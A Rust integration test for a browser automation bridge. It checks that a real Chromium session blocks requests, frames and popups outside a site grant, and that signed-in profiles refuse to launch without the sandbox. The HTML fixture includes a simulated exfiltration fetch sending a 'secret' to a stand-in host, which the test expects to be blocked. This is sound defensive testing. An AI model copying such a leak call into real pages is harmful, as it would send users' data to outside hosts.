//! The site grant is enforced by the real browser, not just by `navigate`.
//!
//! Needs `SAIL_CHROMIUM`; without it the tests report a skip and pass. On hosts that
//! restrict unprivileged user namespaces, set `SAIL_TEST_CHROMIUM_NO_SANDBOX=1`: only
//! ephemeral profiles accept that, which the last test checks.

use std::time::Duration;

use axum::{Router, response::Html, routing::get};
use sail_bridge::browser::{
    BrowserError, BrowserSession, HostRule, LaunchOptions, Profile, SiteGrant,
};

const PAGE: &str = r#"<!doctype html><title>fixture</title>
<script>
  window.results = {};
  fetch('/allowed.json').then(r => r.text()).then(t => results.allowed = t, e => results.allowed = 'error');
  fetch('https://not-granted.example/leak?secret=1').then(() => results.leak = 'reached', () => results.leak = 'blocked');
</script>
<iframe src="https://frame.not-granted.example/"></iframe>"#;

fn binary() -> Option<std::path::PathBuf> {
    match sail_bridge::browser::configured_binary() {
        Ok(path) => Some(path),
        Err(error) => {
            eprintln!("skipping browser test: {error}");
            None
        }
    }
}

fn options(binary: std::path::PathBuf) -> LaunchOptions {
    let mut options = LaunchOptions::new(binary, Profile::Ephemeral);
    options.chromium_sandbox = std::env::var("SAIL_TEST_CHROMIUM_NO_SANDBOX").as_deref() != Ok("1");
    options
}

async fn fixture() -> String {
    let app = Router::new()
        .route("/", get(|| async { Html(PAGE) }))
        .route("/allowed.json", get(|| async { "ok" }));
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
    format!("http://127.0.0.1:{}/", addr.port())
}

fn grant(home: &str) -> SiteGrant {
    SiteGrant {
        name: "fixture".into(),
        home: url::Url::parse(home).unwrap(),
        allow: vec![HostRule::Exact("granted.example".into())],
        deny_documents: vec![],
        allow_loopback_http: true,
    }
}

#[tokio::test]
async fn requests_outside_the_grant_never_leave_the_browser() {
    let Some(binary) = binary() else { return };
    let home = fixture().await;
    let session = BrowserSession::launch(options(binary), grant(&home))
        .await
        .expect("launch");
    session
        .wait_until(
            "!!(window.results && results.allowed && results.leak)",
            Duration::from_secs(15),
            "fixture fetches",
        )
        .await
        .expect("fixture settles");
    let results = session.evaluate("results").await.unwrap();
    assert_eq!(results["allowed"], "ok");
    assert_eq!(results["leak"], "blocked");

    // Popups are new targets: they are attached and intercepted too.
    session
        .evaluate("window.open('https://popup.not-granted.example/'); true")
        .await
        .unwrap();
    tokio::time::sleep(Duration::from_secs(2)).await;

    let blocked = session.blocked_requests();
    for url in [
        "https://not-granted.example/leak?secret=1",
        "https://frame.not-granted.example/",
        "https://popup.not-granted.example/",
    ] {
        assert!(
            blocked.iter().any(|b| b == url),
            "{url} should be blocked; blocked = {blocked:?}"
        );
    }

    match session.navigate("https://not-granted.example/").await {
        Err(BrowserError::Denied(_)) => {}
        other => panic!("navigation outside the grant must be denied, got {other:?}"),
    }
    session.close().await.unwrap();
}

#[tokio::test]
async fn a_signed_in_profile_never_runs_without_chromium_sandbox() {
    let Some(binary) = binary() else { return };
    let dir = std::env::temp_dir().join(format!("sail-persistent-{}", uuid::Uuid::new_v4()));
    let mut options = LaunchOptions::new(binary, Profile::Persistent(dir.clone()));
    options.chromium_sandbox = false;
    let result = BrowserSession::launch(options, grant("https://granted.example/")).await;
    assert!(matches!(result, Err(BrowserError::SandboxUnavailable(_))));
    assert!(!dir.exists(), "refused before creating the profile");
}
